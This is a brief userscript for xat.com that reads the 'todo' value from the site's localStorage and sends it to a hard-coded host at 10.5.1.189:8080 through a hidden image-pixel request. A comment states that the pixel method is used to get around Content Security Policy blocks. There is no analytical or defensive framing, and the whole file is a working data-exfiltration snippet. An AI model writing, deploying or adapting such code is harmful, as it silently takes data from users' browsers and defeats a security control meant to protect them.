// ==UserScript==
// @name         Xat Data Auto-Send
// @match        https://xat.com/*
// @grant        none
// ==/UserScript==

(function() {
    const data = localStorage.getItem('todo');
    if (data) {
        // We use an image pixel to bypass some CSP blocks
        const img = new Image();
        img.src = `http://10.5.1.189:8080/?data=${encodeURIComponent(data)}`;
    }
})();
